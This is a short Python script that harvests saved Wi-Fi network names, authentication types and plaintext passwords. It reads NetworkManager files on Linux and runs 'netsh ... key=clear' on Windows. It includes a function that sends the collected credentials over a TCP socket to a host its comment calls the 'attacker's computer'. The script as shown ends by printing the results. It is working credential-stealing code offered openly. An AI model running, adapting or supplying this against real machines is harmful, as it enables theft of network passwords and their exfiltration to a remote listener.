from os import listdir, name
from subprocess import check_output
from re import findall
import socket


# Linux version (it only works with read privileges on the files in the /etc/NetworkManager/system-connections/ directory)
def linux_profile_collector(file):
    wifi = open(f'/etc/NetworkManager/system-connections/{file}', 'r').readlines()
    profile = [l.replace('\n', '')[l.index('=')+1:] for l in wifi if 'ssid=' in l or 'key-mgmt=' in l or 'psk=' in l] 
    return profile

def linux_ver():
    profiles = map(linux_profile_collector, listdir('/etc/NetworkManager/system-connections/'))  
    return profiles



# Windows version (don't need any special privileges)
def windows_profile_collector(ssid, codepage = '850'):
    codepage = str(codepage)
    output = check_output(f'netsh wlan show profile "{ssid.strip()}" key=clear', encoding=codepage).split('\n')
    #profile = [ssid.strip()]
    profile = list(dict.fromkeys([l.strip().replace('\n', '')[l.index(':')-2:] for l in output if 'Autenticação' in l or 'Conteúdo da Chave' in l]))
    profile.sort()
    profile.insert(0, ssid.strip())
    return profile

def windows_ver():
    ssids = check_output('netsh wlan show profiles', encoding='850')
    ssids = findall('Todos os Perfis de Usuários:(.*)', ssids)
    profiles = map(windows_profile_collector, ssids)
    return profiles


# Checks the OS to use the correct function
if name == 'nt':
    profiles = windows_ver()
elif name == 'posix':
    profiles = linux_ver()

presentation = f'Wifi {"Cipher":^35} Password\n'
for profile in profiles: 
    presentation += f'{profile[0]:17}  {profile[1]:20}  {profile[2]}\n'

# Sends collected profiles to attacker's computer 
# (This function normally assumes that you are running this on your own computer listening on port 123)
def collect_and_send(addr='127.0.0.1', port=123):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((addr, port))
        s.sendall(bytes(presentation, 'utf-8'))
        s.close()

# Print the collected profiles
def collect_and_print():
    print(presentation)


collect_and_print()